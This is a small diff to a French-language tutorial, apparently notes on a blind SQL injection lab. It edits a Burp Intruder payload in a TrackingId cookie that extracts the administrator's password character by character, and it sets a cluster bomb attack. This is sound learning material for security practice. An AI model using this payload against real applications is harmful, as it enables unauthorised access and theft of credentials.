@@ -127,7 +127,7 @@ etc.
 1) Transmettre cette requête dans Burp intruder, et marquer la position du payload sur "1" et "a" : 
 
 ```
-TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='§a§
+TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,§1§,1)+FROM+users+WHERE+username='administrator')='§a§
 ```
 
 2) Utiliser une "attack type - cluster bomb".
